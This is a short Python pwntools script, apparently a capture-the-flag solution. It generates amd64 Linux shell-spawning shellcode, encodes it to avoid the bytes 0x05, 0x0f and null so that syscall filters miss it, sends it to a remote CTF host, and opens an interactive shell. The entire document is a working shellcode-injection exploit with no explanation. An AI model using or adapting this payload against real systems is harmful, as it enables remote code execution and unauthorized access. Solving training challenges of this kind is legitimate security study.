from pwn import *
context(arch='amd64', os='linux')
shellcode = asm(shellcraft.amd64.linux.sh())
shellcode = pwnlib.encoders.encoder.encode(shellcode,'\x05')
shellcode = pwnlib.encoders.encoder.encode(shellcode,'\x0f')
shellcode = pwnlib.encoders.encoder.encode(shellcode,'\x00')
print(shellcode)


p = remote('edu-ctf.csie.org', 10150)
p.sendline(shellcode)
#print(p.recv())
p.interactive()